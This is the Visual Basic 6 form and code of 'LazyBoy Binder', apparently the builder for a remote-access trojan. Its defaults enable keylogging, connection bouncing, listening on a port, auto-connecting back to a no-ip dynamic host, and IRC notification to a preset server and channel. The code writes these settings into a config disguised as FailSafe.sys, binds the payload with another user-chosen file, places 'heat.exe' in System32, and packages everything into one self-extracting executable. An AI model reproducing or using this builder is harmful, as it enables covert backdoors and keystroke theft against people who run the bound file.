VERSION 5.00
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "COMDLG32.OCX"
Begin VB.Form frmMain 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "LazyBoy Binder"
   ClientHeight    =   7920
   ClientLeft      =   45
   ClientTop       =   330
   ClientWidth     =   4575
   Icon            =   "frmMain.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   7920
   ScaleWidth      =   4575
   StartUpPosition =   3  'Windows Default
   Begin VB.CheckBox chkBindSettings 
      Caption         =   "Bind Settings"
      Height          =   255
      Left            =   120
      TabIndex        =   44
      Top             =   120
      Value           =   1  'Checked
      Width           =   4095
   End
   Begin MSComDlg.CommonDialog cd 
      Left            =   4200
      Top             =   0
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin VB.CommandButton cmdCreate 
      Caption         =   "Create Binded Executable"
      Height          =   375
      Left            =   120
      TabIndex        =   38
      Top             =   7440
      Width           =   4335
   End
   Begin VB.Frame fmeHeat 
      Caption         =   "LazyBoy Options"
      Height          =   1095
      Left            =   120
      TabIndex        =   34
      Top             =   6240
      Width           =   4335
      Begin VB.TextBox txtArguments 
         Height          =   285
         Left            =   960
         TabIndex        =   40
         Top             =   720
         Width           =   3255
      End
      Begin VB.CommandButton cmdHeatInputBrowse 
         Caption         =   "..."
         Height          =   255
         Left            =   3840
         TabIndex        =   37
         Top             =   480
         Width           =   375
      End
      Begin VB.TextBox txtHeatInput 
         Height          =   285
         Left            =   960
         TabIndex        =   36
         Top             =   480
         Width           =   2775
      End
      Begin VB.CheckBox chkHeat 
         Caption         =   "Bind LazyBoy"
         Height          =   255
         Left            =   120
         TabIndex        =   43
         Top             =   240
         Width           =   1815
      End
      Begin VB.Label lblHeatArg 
         Caption         =   "Arguments:"
         Height          =   255
         Left            =   120
         TabIndex        =   39
         Top             =   720
         Width           =   855
      End
      Begin VB.Label lblHeatInput 
         Caption         =   "Input File:"
         Height          =   255
         Left            =   120
         TabIndex        =   35
         Top             =   480
         Width           =   855
      End
   End
   Begin VB.Frame fmeBinding 
      Caption         =   "Binding"
      Height          =   1215
      Left            =   120
      TabIndex        =   27
      Top             =   4920
      Width           =   4335
      Begin VB.TextBox txtBindArguments 
         Height          =   285
         Left            =   1080
         TabIndex        =   33
         Top             =   840
         Width           =   3135
      End
      Begin VB.CommandButton cmdBrowse 
         Caption         =   "..."
         Height          =   255
         Left            =   3840
         TabIndex        =   31
         Top             =   600
         Width           =   375
      End
      Begin VB.TextBox txtBindFile 
         Height          =   285
         Left            =   1080
         Locked          =   -1  'True
         TabIndex        =   30
         Top             =   600
         Width           =   2655
      End
      Begin VB.CheckBox chkBind 
         Caption         =   "Bind with file"
         Height          =   255
         Left            =   120
         TabIndex        =   28
         Top             =   240
         Width           =   1215
      End
      Begin VB.Label lblArguments 
         Alignment       =   1  'Right Justify
         Caption         =   "Arguments:"
         Height          =   255
         Left            =   120
         TabIndex        =   32
         Top             =   840
         Width           =   855
      End
      Begin VB.Label lblFileName 
         Alignment       =   1  'Right Justify
         Caption         =   "File:"
         Height          =   255
         Left            =   120
         TabIndex        =   29
         Top             =   600
         Width           =   855
      End
   End
   Begin VB.Frame fmeOther 
      Caption         =   "Other Features"
      Height          =   1095
      Left            =   120
      TabIndex        =   23
      Top             =   3720
      Width           =   4335
      Begin VB.CheckBox chkKeyLogger 
         Caption         =   "Keylogging Enabled"
         Height          =   735
         Left            =   1440
         TabIndex        =   26
         Top             =   240
         Value           =   1  'Checked
         Width           =   1095
      End
      Begin VB.CheckBox chkConnectionBouncing 
         Caption         =   "Connection Bouncing Enabled"
         Height          =   615
         Left            =   120
         TabIndex        =   25
         Top             =   240
         Value           =   1  'Checked
         Width           =   1455
      End
   End
   Begin VB.Frame fmeIRC 
      Caption         =   "IRC Notification"
      Height          =   1575
      Left            =   120
      TabIndex        =   5
      Top             =   2040
      Width           =   4335
      Begin VB.CheckBox chkIrcOwnerOnly 
         Caption         =   "Owner only access"
         Height          =   255
         Left            =   2520
         TabIndex        =   24
         Top             =   240
         Width           =   1695
      End
      Begin VB.TextBox txtIrcOwner 
         Height          =   285
         Left            =   2880
         TabIndex        =   20
         Text            =   "sAnimatio"
         Top             =   960
         Width           =   1335
      End
      Begin VB.TextBox txtIrcName 
         Height          =   285
         Left            =   840
         TabIndex        =   19
         Text            =   "Name"
         Top             =   1200
         Width           =   1335
      End
      Begin VB.TextBox txtIrcEmail 
         Height          =   285
         Left            =   2880
         TabIndex        =   18
         Text            =   "asd@asdf.com"
         Top             =   720
         Width           =   1335
      End
      Begin VB.TextBox txtIrcChannel 
         Height          =   285
         Left            =   840
         TabIndex        =   17
         Text            =   "#covert|online"
         Top             =   960
         Width           =   1335
      End
      Begin VB.TextBox txtIrcNick 
         Height          =   285
         Left            =   2880
         TabIndex        =   16
         Text            =   "[s]"
         Top             =   480
         Width           =   1335
      End
      Begin VB.CheckBox chkIrcEnabled 
         Caption         =   "Enable IRC Notification"
         Height          =   255
         Left            =   120
         TabIndex        =   9
         Top             =   240
         Value           =   1  'Checked
         Width           =   2055
      End
      Begin VB.TextBox txtIrcPort 
         Height          =   285
         Left            =   840
         TabIndex        =   41
         Text            =   "6667"
         Top             =   720
         Width           =   1335
      End
      Begin VB.TextBox txtIrcServer 
         Height          =   285
         Left            =   840
         TabIndex        =   15
         Text            =   "irc.choopa.net"
         Top             =   480
         Width           =   1335
      End
      Begin VB.Label lblIrcPort 
         Alignment       =   1  'Right Justify
         Caption         =   "Port:"
         Height          =   255
         Left            =   120
         TabIndex        =   42
         Top             =   720
         Width           =   615
      End
      Begin VB.Label lblIrcOwner 
         Alignment       =   1  'Right Justify
         Caption         =   "Owner:"
         Height          =   255
         Left            =   2280
         TabIndex        =   12
         Top             =   960
         Width           =   495
      End
      Begin VB.Label lblIrcEmail 
         Alignment       =   1  'Right Justify
         Caption         =   "Email:"
         Height          =   255
         Left            =   2280
         TabIndex        =   11
         Top             =   720
         Width           =   495
      End
      Begin VB.Label lblIrcName 
         Alignment       =   1  'Right Justify
         Caption         =   "Name:"
         Height          =   255
         Left            =   240
         TabIndex        =   10
         Top             =   1200
         Width           =   495
      End
      Begin VB.Label lblIrcNick 
         Alignment       =   1  'Right Justify
         Caption         =   "Nick:"
         Height          =   255
         Left            =   2400
         TabIndex        =   8
         Top             =   480
         Width           =   375
      End
      Begin VB.Label lblIrcChannel 
         Alignment       =   1  'Right Justify
         Caption         =   "Channel:"
         Height          =   255
         Left            =   120
         TabIndex        =   7
         Top             =   960
         Width           =   615
      End
      Begin VB.Label lblIrcServer 
         Alignment       =   1  'Right Justify
         Caption         =   "Server:"
         Height          =   255
         Left            =   120
         TabIndex        =   6
         Top             =   480
         Width           =   615
      End
   End
   Begin VB.Frame fmeConnection 
      Caption         =   "Connection"
      Height          =   1575
      Left            =   120
      TabIndex        =   0
      Top             =   360
      Width           =   4335
      Begin VB.TextBox txtAcPort 
         Height          =   285
         Left            =   3240
         TabIndex        =   22
         Text            =   "2201"
         Top             =   1200
         Width           =   615
      End
      Begin VB.TextBox txtAcHost 
         Height          =   285
         Left            =   840
         TabIndex        =   13
         Text            =   "sickanimations.no-ip.com"
         ToolTipText     =   "Autoconnection host"
         Top             =   1200
         Width           =   1695
      End
      Begin VB.CheckBox chkAutoConnect 
         Caption         =   "Autoconnect to"
         Height          =   255
         Left            =   0
         TabIndex        =   4
         Top             =   960
         Value           =   1  'Checked
         Width           =   1455
      End
      Begin VB.TextBox txtPort 
         Height          =   285
         Left            =   1200
         TabIndex        =   3
         Text            =   "3786"
         Top             =   600
         Width           =   735
      End
      Begin VB.CheckBox chkListen 
         Caption         =   "Listen for and accept incomming connections"
         Height          =   375
         Left            =   0
         TabIndex        =   1
         Top             =   240
         Value           =   1  'Checked
         Width           =   4095
      End
      Begin VB.Label lblAcPort 
         Caption         =   "Port:"
         Height          =   255
         Left            =   2760
         TabIndex        =   21
         Top             =   1200
         Width           =   375
      End
      Begin VB.Label lblAcHost 
         Alignment       =   1  'Right Justify
         Caption         =   "Host:"
         Height          =   255
         Left            =   240
         TabIndex        =   14
         Top             =   1200
         Width           =   495
      End
      Begin VB.Label lblListen 
         Alignment       =   1  'Right Justify
         Caption         =   "Listen on port:"
         Height          =   255
         Left            =   0
         TabIndex        =   2
         Top             =   600
         Width           =   1095
      End
   End
End
Attribute VB_Name = "frmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False

Private Sub cmdBrowse_Click()
    On Error Resume Next
    cd.ShowOpen
    txtBindFile.Text = cd.FileName
End Sub

Private Sub cmdCreate_Click()
    Dim Files() As String, TempINI As String, DestinationPath As String
    'On Error GoTo ErrorHandler
    
    cd.ShowSave
    
    DestinationPath = cd.FileName
    
    ReDim Files(0 To 0)

    If chkBindSettings.Value = 1 Then
        TempINI = "[Connection]" & vbCrLf
        TempINI = TempINI & "AcceptConnections=" & cBoolSng(chkListen.Value) & vbCrLf
        TempINI = TempINI & "AutoConnectEnabled=" & cBoolSng(chkAutoConnect.Value) & vbCrLf
        TempINI = TempINI & "ListenPort=" & txtPort.Text & vbCrLf
        TempINI = TempINI & "AutoConnectHost=" & txtAcHost.Text & vbCrLf
        TempINI = TempINI & "AutoConnectPort=" & txtAcPort.Text & vbCrLf
        TempINI = TempINI & "[Settings]" & vbCrLf
        TempINI = TempINI & "IRC=" & cBoolSng(chkIrcEnabled.Value) & vbCrLf
        TempINI = TempINI & "Keylogger=" & cBoolSng(chkKeyLogger.Value) & vbCrLf
        TempINI = TempINI & "Bouncer=" & cBoolSng(chkConnectionBouncing.Value) & vbCrLf
        TempINI = TempINI & "[IRC]" & vbCrLf
        TempINI = TempINI & "Port=" & txtIrcPort.Text
        TempINI = TempINI & "Server=" & txtIrcServer.Text & vbCrLf
        TempINI = TempINI & "Channel=" & txtIrcChannel.Text & vbCrLf
        TempINI = TempINI & "Nick=" & txtIrcNick.Text & vbCrLf
        TempINI = TempINI & "Name=" & txtIrcName.Text & vbCrLf
        TempINI = TempINI & "Email=" & txtIrcEmail.Text & vbCrLf
        TempINI = TempINI & "Owner=" & txtIrcOwner.Text
        
        Open App.Path & "\tempsettings.tmp" For Binary Access Write As #1
            Put 1, , TempINI
        Close #1
    
        AddToArray Files(), App.Path & "\tempsettings.tmp|*wd*\FailSafe.sys|0"
    
    End If
    
    
    If chkBind.Value = 1 Then
        AddToArray Files(), frmMain.txtBindFile & "|*wd*\Temp\" & GetFile(frmMain.txtBindFile) & "|1"
    End If
    
    If chkHeat.Value = 1 Then
        AddToArray Files(), frmMain.txtHeatInput & "|*wd*\System32\heat.exe|1"
    End If
    
    If MakeSelfExtractor(App.Path & "\se.bin", DestinationPath, Files()) <> 0 Then
        MsgBox "Heat was successfully binded.", vbInformation + vbOKOnly, "Success"
    Else
        MsgBox "There was an error binding heat.", vbCritical + vbOKOnly, "Error"
    End If
    
    Exit Sub
ErrorHandler:
    MsgBox "Error #" & Err.Number & ": " & Err.Description, vbCritical + vbOKOnly, "Error Archiving..."
End Sub

Function AddToArray(ByRef Arr() As String, Item As String)
'Debug.Print Item
    If Arr(UBound(Arr())) = "" Then
        Arr(UBound(Arr)) = Item
    Else
        ReDim Preserve Arr(0 To UBound(Arr) + 1)
        Arr(UBound(Arr)) = Item
    End If
End Function

Private Sub cmdHeatInputBrowse_Click()
    On Error GoTo ErrorHandler
    cd.ShowOpen
    
    txtHeatInput.Text = cd.FileName
ErrorHandler:
End Sub

Function cBoolSng(iBool As Boolean) As String
    If iBool = True Then
        cBoolSng = "1"
    Else
        cBoolSng = "0"
    End If
End Function

